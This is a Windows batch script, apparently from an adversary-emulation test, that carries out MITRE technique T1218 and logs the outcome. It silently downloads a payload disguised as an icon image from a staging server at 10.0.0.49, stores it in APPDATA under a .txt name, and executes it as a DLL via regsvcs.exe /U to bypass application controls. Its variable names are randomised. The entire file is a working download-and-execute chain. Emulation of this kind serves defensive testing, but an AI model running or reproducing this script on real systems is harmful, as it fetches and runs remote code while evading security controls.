@echo off
setlocal enabledelayedexpansion

REM Placeholder constant declarations (random-named SET vars, one per PHR_*)
SET aBcD1=%APPDATA%\12060\3797fecd
SET eFgH2=866b330b.txt
SET iJkL3=https://10.0.0.49/stage/2/icon.png?12060-7
SET mNoP4=ITZEL-S2B
SET qRsT5=12060
SET uVwX6=7
SET yZ12=%PUBLIC%\\macula-simulations.log
SET AbCd3=https://10.0.0.49

REM Cache timestamp for debug logging
SET tsvar=!DATE!/!TIME!

REM Debug log: script start
echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: script_start>> "!yZ12!" 2>nul

REM Ensure output directory exists
if not exist "!aBcD1!" mkdir "!aBcD1!" >nul 2>&1

REM Step 1: Heartbeat fetch (curl download)
echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: heartbeat_start>> "!yZ12!" 2>nul
curl -k -s -o "!aBcD1!\!eFgH2!" "!iJkL3!"
set curl_exit=!ERRORLEVEL!
echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: heartbeat_complete=!curl_exit!>> "!yZ12!" 2>nul

REM Step 2: Change working directory
echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: chdir_start>> "!yZ12!" 2>nul
cd /d "!aBcD1!" >nul 2>&1
set chdir_exit=!ERRORLEVEL!
echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: chdir_result=!chdir_exit!>> "!yZ12!" 2>nul

REM Step 3: Invoke DLL via regsvcs.exe /U (LOLBIN)
echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: regsvcs_start>> "!yZ12!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe /U "!eFgH2!" >NUL 2>&1
set reg_exit=!ERRORLEVEL!
echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: regsvcs_result=!reg_exit!>> "!yZ12!" 2>nul

REM Generate timestamp for TTP log (millisecond precision)
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set timestamp=%%t

REM Determine TTP result and reason
set result=OK
set error=
if !reg_exit! neq 0 (
    set result=FAIL
    set error=regsvcs_exit_!reg_exit!
)

REM Write TTP log line
echo [!timestamp!][TTP][!mNoP4!][!qRsT5!]: T1218^|System Binary Proxy Execution=!result!:!error!>> "!yZ12!" 2>&1

REM Debug log: script end
echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: script_end>> "!yZ12!" 2>nul

endlocal